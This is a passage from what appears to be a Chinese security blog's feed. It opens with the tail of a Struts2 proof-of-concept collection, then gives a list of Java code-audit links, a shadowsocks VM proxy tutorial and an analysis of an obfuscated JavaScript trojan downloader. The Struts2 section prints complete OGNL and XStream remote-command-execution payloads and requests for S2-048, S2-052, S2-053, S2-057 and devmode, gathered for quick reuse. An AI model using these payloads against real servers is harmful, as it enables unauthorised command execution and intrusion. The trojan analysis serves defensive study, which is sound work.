-an&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\x000&quot;</span><br><span class="line"> </span><br><span class="line">files =&#123;&quot;test&quot;:(uploadexp, &quot;text/plain&quot;)&#125;</span><br><span class="line">req = requests.post(self.url, files=files,)</span><br></pre></td></tr></table></figure><h3 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h3><p>POST</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /S2-048/integration/saveGangster.action HTTP/1.1</span><br><span class="line">Host: 192.168.159.146:8080</span><br><span class="line">Connection: close</span><br><span class="line">Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1217</span><br><span class="line"></span><br><span class="line">age=1&amp;__checkbox_bustedBefore=true&amp;name=name%3D%25%7B%28%23nike%3D%27multipart%2Fform-data%27%29.%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27netstat+-an%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&amp;description=1</span><br></pre></td></tr></table></figure><h3 id="S2-052"><a href="#S2-052" class="headerlink" title="S2-052"></a>S2-052</h3><p>POST</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /S2-052/orders/3/ HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 1616</span><br><span class="line">Referer: http://127.0.0.1:8080/orders/3/edit</span><br><span class="line">Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;whoami&lt;/string&gt;&lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;/map&gt;</span><br></pre></td></tr></table></figure><h3 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h3><p>GET</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=%25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3d%27netstat+-an%27).(%23iswin%3d(%40java.lang.System%40getProperty(%27os.name%27).toLowerCase().contains(%27win%27))).(%23cmds%3d(%23iswin%3f%7b%27cmd.exe%27%2c%27%2fc%27%2c%23cmd%7d%3a%7b%27%2fbin%2fbash%27%2c%27-c%27%2c%23cmd%7d)).(%23p%3dnew+java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3d%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7d</span><br></pre></td></tr></table></figure><h3 id="S2-057"><a href="#S2-057" class="headerlink" title="S2-057"></a>S2-057</h3><p>URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">检测</span><br><span class="line">/$%7B233*233%7D/actionChain1.action</span><br><span class="line"></span><br><span class="line">2.3.20 版本</span><br><span class="line">/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action</span><br><span class="line"></span><br><span class="line">2.3.34 版本</span><br><span class="line">/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action</span><br></pre></td></tr></table></figure></p><h3 id="S2-devmode"><a href="#S2-devmode" class="headerlink" title="S2-devmode"></a>S2-devmode</h3><p>GET</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=netstat%20-an</span><br><span class="line"></span><br><span class="line">debug=command&amp;expression=%28%23parameters%29</span><br><span class="line"></span><br><span class="line">debug=command&amp;expression=%28%23application%29</span><br><span class="line"></span><br><span class="line">debug=command&amp;expression=(%23wr%3D%23context%5B%23parameters.obj%5B0%5D%5D.getWriter())!%3D(%23wr.println(%23parameters.content%5B0%5D))!%3D(%23wr.flush())!%3D(%23wr.close())&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=7f604dbaced33b7d9c2d5e1212eba16e</span><br></pre></td></tr></table></figure><p>​    </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;每次看Struts2历史漏洞POC都要去百度，有点麻烦。所以收集了网上的POC放在一起，查阅比较方便。&lt;br&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://x-f1v3.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Java" scheme="http://x-f1v3.github.io/tags/Java/"/>
    
      <category term="漏洞" scheme="http://x-f1v3.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="POC" scheme="http://x-f1v3.github.io/tags/POC/"/>
    
      <category term="Struts2" scheme="http://x-f1v3.github.io/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>Java代码审计相关文章（长期更新）</title>
    <link href="http://x-f1v3.github.io//blog/1521424233278.html"/>
    <id>http://x-f1v3.github.io//blog/1521424233278.html</id>
    <published>2018-03-19T01:50:33.000Z</published>
    <updated>2019-06-13T05:28:12.222Z</updated>
    
    <content type="html"><![CDATA[<p>Java代码审计相关文章<br><a id="more"></a></p><h3 id="Java代码审计学习"><a href="#Java代码审计学习" class="headerlink" title="Java代码审计学习"></a>Java代码审计学习</h3><ul><li><a href="https://xianzhi.aliyun.com/forum/topic/1633" target="_blank" rel="noopener">JAVA代码审计的一些Tips(附脚本)</a></li><li><a href="https://xianzhi.aliyun.com/forum/topic/1073" target="_blank" rel="noopener">补天沙龙南京站—Java代码审计PPT</a></li><li>​</li><li><a href="http://wooyun.jozxing.cc/static/drops/tips-163.html" target="_blank" rel="noopener">攻击JavaWeb应用[1]-JavaEE 基础</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/tips-164.html" target="_blank" rel="noopener">攻击JavaWeb应用[2]-CS交互安全</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/tips-236.html" target="_blank" rel="noopener">攻击JavaWeb应用[3]-SQL注入[1]</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/tips-288.html" target="_blank" rel="noopener">攻击JavaWeb应用[4]-SQL注入[2]</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/tips-347.html" target="_blank" rel="noopener">攻击JavaWeb应用[5]-MVC安全</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/tips-429.html" target="_blank" rel="noopener">攻击JavaWeb应用[6]-程序架构与代码审计</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/tips-604.html" target="_blank" rel="noopener">攻击JavaWeb应用[7]-Server篇[1]</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/tips-662.html" target="_blank" rel="noopener">攻击JavaWeb应用[8]-后门篇</a></li><li><a href="http://www.freebuf.com/column/143595.html" target="_blank" rel="noopener">[代码审计] Java代码审计连载之—添油加醋</a></li><li><a href="https://paper.seebug.org/312/" target="_blank" rel="noopener">深入理解 JAVA 反序列化漏洞</a></li><li><a href="http://www.nxadmin.com/web/1332.html" target="_blank" rel="noopener">Java代码审计基础(一)</a></li><li><a href="https://paper.tuisec.win/detail/be2213ad38a0645" target="_blank" rel="noopener">javaweb的常见web漏洞</a></li><li><a href="https://www.secpulse.com/archives/54652.html" target="_blank" rel="noopener">谈一谈java代码审计—安全小课堂第四十一期</a></li><li><a href="https://blog.csdn.net/jameson_/article/details/73111402" target="_blank" rel="noopener">Java代码审计之文件包含</a></li></ul><h3 id="Java代码审计实际案例"><a href="#Java代码审计实际案例" class="headerlink" title="Java代码审计实际案例"></a>Java代码审计实际案例</h3><ul><li><a href="http://www.freebuf.com/articles/web/162910.html" target="_blank" rel="noopener">某租车系统JAVA代码审计</a></li><li><a href="https://paper.tuisec.win/detail/98751f3fb2340b7" target="_blank" rel="noopener">Java代码审计-铁人下载系统</a></li><li><a href="http://www.codersec.net/2016/12/%E9%93%81%E4%BA%BA%E4%B8%8B%E8%BD%BD%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">铁人下载系统代码审计</a></li><li><a href="http://www.zhutougg.com/2018/03/05/java-eedai-ma-shen-ji-shi-li-ji-lou-dong-xiu-fu/" target="_blank" rel="noopener">Java EE代码审计实例及漏洞修复</a></li><li><a href="http://foreversong.cn/archives/1033" target="_blank" rel="noopener">JAVA代码审计之团队CMS v1.0</a></li><li><a href="https://xianzhi.aliyun.com/forum/topic/2174" target="_blank" rel="noopener">某 Java 急速开发框架分析与挖掘</a></li><li><a href="https://mp.weixin.qq.com/s/WT1EXEryUGGqHQpSi959xw" target="_blank" rel="noopener">精品漏洞第4弹——层层放大java审计的攻击面</a></li><li><a href="https://www.secpulse.com/archives/27705.html" target="_blank" rel="noopener">JEECMS|JEEBBS|JSPGOU 前台getshell(高危)</a></li><li><a href="https://www.secpulse.com/archives/47545.html" target="_blank" rel="noopener">Live800在线客服系统SQL注射/未授权查看对话记录</a></li><li><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0177183.html?_360safeparam=25046958" target="_blank" rel="noopener">Live800在线客服系统默认密码导致的SQL查询/SQL注射漏洞</a></li><li><a href="http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2015-0147322" target="_blank" rel="noopener">live800客服系统任意文件下载漏洞</a></li><li><a href="http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2015-0147511" target="_blank" rel="noopener">live800在线客服系统SQL注射漏洞</a></li><li><a href="https://www.seebug.org/vuldb/ssvid-89306" target="_blank" rel="noopener">Enorth Webpublisher CMS SQL Injection from delete_pending_news.jsp</a></li><li>​</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Java代码审计相关文章&lt;br&gt;
    
    </summary>
    
      <category term="Java代码审计" scheme="http://x-f1v3.github.io/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java" scheme="http://x-f1v3.github.io/tags/Java/"/>
    
      <category term="代码审计" scheme="http://x-f1v3.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Linux虚拟机使用主机shadowsocks代理上网</title>
    <link href="http://x-f1v3.github.io//blog/1520349399715.html"/>
    <id>http://x-f1v3.github.io//blog/1520349399715.html</id>
    <published>2018-03-06T15:16:39.000Z</published>
    <updated>2019-06-13T05:43:31.491Z</updated>
    
    <content type="html"><![CDATA[<p>无意中发现虚拟机也能通过shadowsocks代理上网，而且非常方便，尝试了一波<br><a id="more"></a></p><h3 id="0x01-查看本机IP"><a href="#0x01-查看本机IP" class="headerlink" title="0x01 查看本机IP"></a>0x01 查看本机IP</h3><p><code>ipconfig</code>,找到主机的IP<br><img src="http://x-f1v3.github.io/images/1520350003892.png" alt="image"><br>我这里使用的wifi，所以显示的是局域网地址，总之，能<code>ping</code>通就行。</p><h3 id="0x02-查看SS本地端口"><a href="#0x02-查看SS本地端口" class="headerlink" title="0x02 查看SS本地端口"></a>0x02 查看SS本地端口</h3><p>接下来就是连上SS，然后查看本地端口（默认是1080），我这里是<code>1081</code><br><img src="http://x-f1v3.github.io/images/1520351125422.png" alt="image"></p><h3 id="0x03-允许SS来自局域网的连接"><a href="#0x03-允许SS来自局域网的连接" class="headerlink" title="0x03  允许SS来自局域网的连接"></a>0x03  允许SS来自局域网的连接</h3><p><img src="http://x-f1v3.github.io/images/1520351208941.png" alt="image"></p><h3 id="0x04-虚拟机设成NAT模式"><a href="#0x04-虚拟机设成NAT模式" class="headerlink" title="0x04 虚拟机设成NAT模式"></a>0x04 虚拟机设成NAT模式</h3><p><img src="http://x-f1v3.github.io/images/1520351381763.png" alt="image"></p><h3 id="0x05-进入系统设置代理"><a href="#0x05-进入系统设置代理" class="headerlink" title="0x05 进入系统设置代理"></a>0x05 进入系统设置代理</h3><p><img src="http://x-f1v3.github.io/images/1520351509007.png" alt="image"></p><h3 id="0x06-成功代理"><a href="#0x06-成功代理" class="headerlink" title="0x06 成功代理"></a>0x06 成功代理</h3><p><img src="http://x-f1v3.github.io/images/1520351585870.png" alt="image"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://blog.csdn.net/zzl1243976730/article/details/63695131" target="_blank" rel="noopener">http://blog.csdn.net/zzl1243976730/article/details/63695131</a></li><li><a href="http://blog.csdn.net/u010726042/article/details/53187937" target="_blank" rel="noopener">http://blog.csdn.net/u010726042/article/details/53187937</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无意中发现虚拟机也能通过shadowsocks代理上网，而且非常方便，尝试了一波&lt;br&gt;
    
    </summary>
    
      <category term="日常姿势" scheme="http://x-f1v3.github.io/categories/%E6%97%A5%E5%B8%B8%E5%A7%BF%E5%8A%BF/"/>
    
    
      <category term="日常" scheme="http://x-f1v3.github.io/tags/%E6%97%A5%E5%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>记一次JS木马分析</title>
    <link href="http://x-f1v3.github.io//blog/1514542114971.html"/>
    <id>http://x-f1v3.github.io//blog/1514542114971.html</id>
    <published>2017-12-29T10:08:34.000Z</published>
    <updated>2019-06-13T05:42:54.790Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>　　随着 <code>javascript</code> 这类脚本语言的快速发展，它能展现的内容越来越多样，所运用的功能变得越来越强大。当运用在 <code>web</code> 开发上时，增加了更多的动态功能和效果，极大的改善了用户体验。但是，随着 <code>js</code> 的功能强大的同时，也带来了更多的安全隐患。由于 <code>js</code> 的混淆效果多样，常见的有 <code>YUI Compressor</code>、<code>Google Closure Compiler</code>、<code>UglifyJS</code>。更有 <code>jsfuck</code> 这种比较奇葩的加密方式。使得让软件自动的识别特征码，查杀 <code>js</code> 恶意代码变的非常困难。对 <code>JavaScript</code> 恶意代码的检测已成为 <code>Web</code> 信息安全领域一个亟待解决的问题。<br>　　因为近期偶然发现一个 <code>js</code> 木马文件，所以想探寻一下 <code>js</code> 木马的混淆方法和这个木马起的作用。<br><a id="more"></a></p><h3 id="0x01-解混淆"><a href="#0x01-解混淆" class="headerlink" title="0x01 解混淆"></a>0x01 解混淆</h3><p>　　首先打开 <code>js</code> 文件，看到的就是一个很明显的 <code>var PAa = &quot;&quot;;</code> 定义了一个变量，然后是大段的代码：<img src="http://image.3001.net/images/20171215/15133070905422.jpg" alt="img"></p><p>　　这大段的代码都是以函数执行的方式放在数组里的，我们在仔细看一下数组第一个元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(function f000()&#123;return &quot;Sq&quot;;&#125;)()</span><br></pre></td></tr></table></figure><p>　　发现，这数组的第一个元素其实就是字符串 <code>Sq</code>,但是是以函数执行后返回的结果显示的，其他数组元素也是这样的。非常的巧妙，等于加了一层壳，防止被跟踪查杀。</p><p>　　接着我们看到最后：</p><p><img src="http://image.3001.net/images/20171215/151330724114.jpg" alt="img"></p><p>　　发现，又定义了一个字典，然后对中间数组元素进行对照替换处理，得到真正的字符，而且这个字符也不是真正的字符，而是以 16 进制的形式表示的。然后拼接到开始定义的 <code>PAa</code> 这个变量中，最后 <code>eval</code> 执行这段代码，那毫无疑问，最后 <code>PAa</code> 这个变量存储的东西就是真正的代码了。</p><p>　　在这里，就可以用 <code>document.write()</code> 来直接输出 <code>PAa</code> 这个变量的内容，也就是明文代码了。</p><p>　　这第一层的混淆，相当于对代码进行”加壳”处理，通过函数，数组，字典、16进制等方式进行层层替换，最后才得出代码。</p><h3 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h3><p>　　对于输出的代码，在进行美化和调整一下格式，终于达到人能理解的程度了。但是代码还是有第二层的混淆，不过这层的混淆就是些字符串的拼接与组合，已达到骗过机器追踪关键字的目的，从而达到免杀的效果。但对人来说，还是可以判断分析出来的：</p><p><img src="http://image.3001.net/images/20171215/15133077756072.jpg" alt="img"></p><p>　　下面就来分析一下，这个木马到底做了哪些操作。</p><h4 id="判断cmd-exe的路径"><a href="#判断cmd-exe的路径" class="headerlink" title="判断cmd.exe的路径"></a>判断cmd.exe的路径</h4><p>　　代码开始就是执行了一个函数：</p><p><img src="http://image.3001.net/images/20171215/15133077711467.jpg" alt="img"></p><p>　　可以看到，在这里也是对字符进行拼接，最后凑出来的关键字。 这个函数的大概意思就是通过创建  <code>WScript.Shell</code> 对象来查看环境变量中的 <code>COMSPEC</code> 值，这个值是返回命令行解释器可执行程序的准确路径，就是 <code>cmd.exe</code> 的路径。然后与系统目录下的 <code>system32\cmd.exe</code> 进行比较。判断 <code>cmd.exe</code> 的路径。</p><h4 id="扩展与查看环境变量"><a href="#扩展与查看环境变量" class="headerlink" title="扩展与查看环境变量"></a>扩展与查看环境变量</h4><p><img src="http://image.3001.net/images/20171215/15133077754683.jpg" alt="img"></p><p>　　这里，也是经过一连串的字符的替换与拼接，大致还原出原来的样子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Za3 + OHb + PVg7 + Tp7 + QRn4  表示  CreateObject</span><br><span class="line">OEl7 + Pa + Eu  表示  WScript.Shell</span><br><span class="line">Js9 + Vh + PVx + COb3 表示 %TEMP%/</span><br></pre></td></tr></table></figure><p>这里的意思就是通过扩充环境字串 <code>%TEMP%/</code>，并在该目录下，创建出一串无意义名字的后缀为 <code>dll</code> 的字符串，即 <code>xx.dll</code> 赋值于 <code>GLq</code> 这个变量中，为后面的写文件做铺垫，继续看下去：</p><p><img src="http://image.3001.net/images/20171215/15133077728391.jpg" alt="img"></p><p>　　接下来，就是查看环境变量中的 <code>PROCESSOR_ARCHITECTUREiD</code>，来判断系统是 64，还是 32 位，最后选择相对应的 <code>rundll32.exe</code>，用于后面执行恶意动态链接库的函数。其中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cc5 + TXr9 + HUf + YEn7 + Ci5 + SDb9 表示 PROCESSOR_ARCHITECTURE</span><br><span class="line">Vg  表示 &quot;%SystemRoot%\\system32\\rundll32.exe&quot; + &quot;&quot;</span><br><span class="line">ZPt 表示  &quot;%SystemRoot%\\SysWOW64\\rundll32.exe&quot; + &quot;&quot;</span><br></pre></td></tr></table></figure><h4 id="下载恶意文件"><a href="#下载恶意文件" class="headerlink" title="下载恶意文件"></a>下载恶意文件</h4><p><img src="http://image.3001.net/images/20171215/15133077748992.jpg" alt="img"></p><p>　　创建 <code>http</code> 请求对象，其中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zm6 表示 [MSXML2.XMLHTTP,WinHttp.WinHttpRequest.5.1]</span><br></pre></td></tr></table></figure><p>　　这 2 个都是能实现 <code>HTTP</code> 请求响应的组件，这里是尝试创建这其中任意一个组件对象。</p><p>　　紧接着，就是判断在 <code>%TEMP%/</code> 是否已有 <code>xx.dll</code> ，即是否已经被攻击，如果没有的话，就继续执行下去，也就是访问恶意网站，下载要在计算机上执行的恶意文件，并放在 <code>%TEMP%/</code> 目录下的临时文件中,当然文本也是加密处理的:</p><p><img src="http://image.3001.net/images/20171215/15133077725499.jpg" alt="img"></p><h4 id="解密并校验恶意文件"><a href="#解密并校验恶意文件" class="headerlink" title="解密并校验恶意文件"></a>解密并校验恶意文件</h4><p>　　存放临时文件后，因为文件内容也是经过混淆处理的，所以要重新从文件中取出内容进行处理与校验。我们来看下关键函数 <code>IGi2</code> 函数。</p><p><img src="http://image.3001.net/images/20171215/15133077756386.jpg" alt="img"></p><p><img src="http://image.3001.net/images/20171215/15133077738951.jpg" alt="img"></p><p>　　可以看到，主要的方法就是通过字符的 <code>unicode</code> 编码，针对恶意文本的一些特定字符的 <code>unicode</code> 编码进行替换。但是还没完，还有一个步骤：</p><p><img src="http://image.3001.net/images/20171215/15133129695110.jpg" alt="img"></p><p>　　对所有的数字进行异或运算。在最后，还要通过一系列特定的计算，与后四位的标志位进行比较，进行文本内容的校验，来判断该文本是否被修改，或者是内容不全。</p><p>　　之后，还加上了一层保险，就是判断整个恶意文件的字符数，保证是在一定的区间内。</p><p><img src="http://image.3001.net/images/20171215/15133077725586.jpg" alt="img"></p><h4 id="执行恶意文件代码"><a href="#执行恶意文件代码" class="headerlink" title="执行恶意文件代码"></a>执行恶意文件代码</h4><p>　　最后，在判断过字符个数，没问题之后，就直接写入 <code>dll</code> 文件，准备执行了，如上图。</p><p>　　但是我们知道，要写入文本的字符串现在还都是 <code>unicode</code> 编码的，所以需要还原成真正的字符串才行，这里是通过 <code>St</code> 函数。而这个 <code>St</code> 函数和上面的 <code>IGi2</code> 函数的作用是一样的，只不过数组是反的，这也是我疑惑的地方，它的作用就是把之前替换掉的数字替换回来，然后进行全部的 <code>unicode</code> 解码，变成字符串。至于为什么要把替换掉的字符换回来？由于恶意网站已无法访问，所以拿不到下载的恶意文本，是注释？还是另一层混淆？这点就无法判断了，也是非常的遗憾。</p><p><img src="http://image.3001.net/images/20171215/15133077721438.jpg" alt="img"></p><p>　　在写入文件之后，就通过命令 <code>Rundll32.exe DLLname,Functionname [Arguments]</code> 的形式运行 <code>dll</code> 文件里的函数了。</p><h3 id="0x03-免杀方式总结"><a href="#0x03-免杀方式总结" class="headerlink" title="0x03 免杀方式总结"></a>0x03 免杀方式总结</h3><p>　　<code>js</code> 的混淆能力真的很强大，简单总结一下上面木马的混淆免杀方式，第一层混淆就是通过了函数返回值，数组，字典、16 进制表示字符等方式进行层层替换，得到真正的代码。第二层混淆就是在代码执行过程中对关键字进行字符串的拼接，躲避对关键字的查杀，简单而有效。第三层混淆就是通过 <code>unicode</code> 编码，利用特定数值替换，然后通过异或等数学方法得到代码明文，对下载的恶意文件中的字符进行解密操作。整个过程体现了对普通杀毒软件的极强的欺骗性和防御性。</p><h3 